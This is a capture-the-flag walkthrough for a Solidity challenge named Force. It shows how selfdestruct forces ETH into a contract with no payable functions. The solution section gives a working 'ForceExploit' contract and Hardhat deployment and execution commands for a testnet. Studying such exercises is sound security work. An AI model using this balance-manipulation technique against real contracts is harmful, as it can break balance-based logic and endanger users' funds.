# Level 7: Force Challenge

## Challenge Description

This level introduces a unique concept in Ethereum: forcing ETH into a contract that doesn't have any payable functions. The goal is to make the target contract's balance greater than zero, even though it appears impossible at first glance.

## Contract Location

The challenge contract is located at:
```
/contracts/level-07-force/Force.sol
```

## Understanding the Challenge

The `Force` contract is completely empty - it doesn't have any functions, not even a fallback or receive function:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
*/
}
```

It seems impossible to send ETH to this contract since it doesn't have any payable functions, but there's a specific mechanism in Ethereum that allows forcing ETH into any contract.

### The Vulnerability

In Ethereum, there are three ways a contract can receive ETH:
1. Through a payable function
2. Through a payable fallback or receive function
3. As the recipient of a `selfdestruct` operation

The third method is the key to solving this challenge. When a contract self-destructs (via the `selfdestruct` function), it can send its remaining ETH to any address, even if that address is a contract without payable functions.

## Winning Strategy

To win this challenge, you need to:

1. Create a contract with ETH in its balance
2. Make this contract call `selfdestruct` with the Force contract's address as the recipient
3. This will force ETH into the Force contract, making its balance greater than zero

## Hint for Thinking

Ask yourself:
* What are all the possible ways a contract can receive ETH in Ethereum?
* What happens to the funds in a contract when it's destroyed?
* Can you bypass the normal mechanisms for sending ETH to a contract?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

The solution involves creating a contract that can receive ETH and then self-destruct, sending its balance to the Force contract.

### Solution Contract

```solidity
contract ForceExploit {
    address payable public target;
    
    constructor(address payable _targetAddress) {
        target = _targetAddress;
    }
    
    // Allows the contract to receive ETH
    receive() external payable {}
    
    // Forces ETH to the target by self-destructing
    function attack() external {
        require(address(this).balance > 0, "Need ETH to perform the attack");
        selfdestruct(target);
    }
}
```

## Step-by-Step Solution Guide

### 1. Deploy the Force Contract

If you're testing locally, deploy the Force contract first:

```shell
npx hardhat deploy --tags force
```

### 2. Deploy the Solution Contract

Deploy the ForceExploit contract, passing the address of the Force contract:

```shell
# Using the deployment script with tags
npx hardhat deploy --tags force-solution --network sepolia

# Or specifying a custom target address
TARGET_ADDRESS=0xYourForceAddress npx hardhat deploy --tags force-solution --network sepolia
```

### 3. Execute the Solution

Run the provided script to send ETH to the ForceExploit contract and then trigger the self-destruct:

```shell
npx hardhat run scripts/level-07-force/execute-force-exploit.ts --network sepolia
```

This script will:
1. Send a small amount of ETH (0.001 ETH) to the ForceExploit contract
2. Call the `attack()` function, which will self-destruct the contract and force the ETH to the target
3. Verify the target's balance to confirm success

### 3. Verify Your Success

After executing the solution, the script will check the Force contract's balance. If it's greater than zero, you've completed the challenge.

## Lessons Learned

This challenge teaches important concepts about ETH transfers and contract destruction:

1. **Forced ETH Reception**: There's no way to prevent a contract from receiving ETH via the `selfdestruct` mechanism.

2. **selfdestruct Operation**: The `selfdestruct` operation removes the contract from the blockchain state and sends all remaining ETH to the specified address, regardless of whether that address is equipped to receive it.

3. **Contract Design**: When designing contracts that rely on having zero balance, you must be aware that this condition can be violated using `selfdestruct`.

4. **Balance Security**: Never rely solely on a contract's balance for security checks, as its balance can be manipulated in ways that bypass normal ETH transfer mechanisms.
